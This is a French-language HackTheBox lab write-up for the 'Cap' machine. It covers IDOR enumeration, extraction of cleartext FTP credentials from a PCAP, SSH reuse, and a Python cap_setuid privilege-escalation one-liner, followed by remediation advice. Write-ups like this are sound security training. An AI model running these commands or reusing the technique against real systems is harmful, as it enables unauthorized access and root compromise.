# Cap - HackTheBox Writeup

![HTB Cap](https://img.shields.io/badge/HackTheBox-Cap-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)

## Box Info

| Property | Value |
|----------|-------|
| Name | Cap |
| OS | Linux |
| Difficulty | Easy |
| Release | 2021 |
| IP | 10.129.45.142 |

---

## Summary

1. **Recon** : 3 ports ouverts (FTP, SSH, HTTP)
2. **IDOR** : Accès aux captures réseau d'autres utilisateurs via `/data/0`
3. **Credentials** : Extraction de credentials FTP en clair dans un fichier PCAP
4. **Lateral Movement** : Réutilisation des credentials sur SSH
5. **Privesc** : Exploitation de capabilities Python (`cap_setuid`)

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 10.129.45.142
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**3 ports ouverts** : FTP (21), SSH (22), HTTP (80)

### Web Enumeration

En naviguant sur le site web, on découvre une application de "Security Dashboard" permettant de créer des "Security Snapshots" (captures réseau).

L'URL après un scan : `http://10.129.45.142/data/1`

---

## Exploitation

### IDOR (Insecure Direct Object Reference)

En modifiant l'ID dans l'URL, on peut accéder aux captures d'autres utilisateurs :

```
http://10.129.45.142/data/0  ← Intéressant !
http://10.129.45.142/data/1
http://10.129.45.142/data/2
```

Le fichier `/data/0` contient une capture PCAP avec des données sensibles.

### Analyse PCAP

Téléchargement et analyse avec Wireshark :

```bash
# Filtre pour voir les credentials FTP
ftp.request.command == "USER" || ftp.request.command == "PASS"
```

Ou via **Follow TCP Stream** sur le trafic FTP.

**Credentials trouvés :**
```
USER nathan
PASS Buck3tH4TF0RM3!
```

### Accès Initial (SSH)

Les credentials FTP fonctionnent également sur SSH :

```bash
ssh nathan@10.129.45.142
# Password: Buck3tH4TF0RM3!
```

### User Flag

```bash
nathan@cap:~$ cat user.txt
[FLAG]
```

---

## Privilege Escalation

### Enumeration

Recherche de binaires avec des capabilities spéciales :

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_setgid+ep
```

**Python3.8 a la capability `cap_setuid`** → On peut changer notre UID pour devenir root.

### Exploitation

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
root@cap:~# whoami
root
root@cap:~# cat /root/root.txt
[FLAG]
```

---

## Lessons Learned

| Vulnerability | Description | Remediation |
|---------------|-------------|-------------|
| **IDOR** | Accès aux ressources d'autres utilisateurs via manipulation d'ID | Implémenter des contrôles d'autorisation côté serveur |
| **Cleartext Credentials** | Credentials FTP transmis en clair | Utiliser SFTP ou FTPS |
| **Password Reuse** | Même mot de passe pour FTP et SSH | Utiliser des mots de passe uniques par service |
| **Dangerous Capabilities** | Python avec cap_setuid | Auditer les capabilities avec `getcap -r /` |

---

## Tools Used

- nmap
- Wireshark
- SSH

---

## References

- [GTFOBins - Capabilities](https://gtfobins.github.io/#+capabilities)
- [HackTricks - Linux Capabilities](https://book.hacktricks.wiki/linux-hardening/privilege-escalation/linux-capabilities)
- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
